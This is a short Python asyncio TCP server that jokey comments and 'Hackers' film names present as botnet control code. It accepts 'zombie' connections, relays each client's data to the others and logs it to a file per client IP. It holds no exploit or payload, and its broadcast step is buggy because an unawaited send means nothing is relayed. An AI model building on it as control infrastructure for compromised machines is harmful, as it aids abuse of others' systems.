############################################
# This is illegal. Build a wall around it. #
# Or don't deploy it. Up to you.           #
############################################
from socket import *
import asyncio


class ZeroCool:
    """
    Are you not supposed to comment
    botnet code? Is that bad?
    CSI: CYBER says it's bad..
    Damn, I might've slipped up!

    Also, this is the server class.
    """

    def __init__(self):
        self.zombies = []
        self.loop = asyncio.get_event_loop()

    def broadcast(self, client, data):
        for zombie in self.zombies:
            if zombie is not client:
                self.loop.sock_sendall(zombie, data)

    # Server function
    async def cereal_killer(self, address):
        # INITIATE REDSHIELD5
        sock = socket(AF_INET, SOCK_STREAM)
        sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        sock.bind(address)
        sock.listen(5)
        sock.setblocking(False)
        while True:
            client, addr = await self.loop.sock_accept(sock)
            self.zombies.append(client)
            print('Welcome {} to Zombieland.'.format(str(addr)))
            self.loop.create_task(self.acid_burn(client, addr))

    # Client handler
    async def acid_burn(self, client, addr):
        with client:
            while True:
                data = await self.loop.sock_recv(client, 10000)
                zombie_host = str(addr[0])

                self.broadcast(client, data)

                with open(zombie_host, 'a') as data_store:
                    data_store.write('\n' + str(data))
                if not data:
                    break
                print(data)
            print('Zombie just got popped.')

    def run(self):
        self.loop.create_task(self.cereal_killer(('', 25000)))
        self.loop.run_forever()

net = ZeroCool()
net.run()
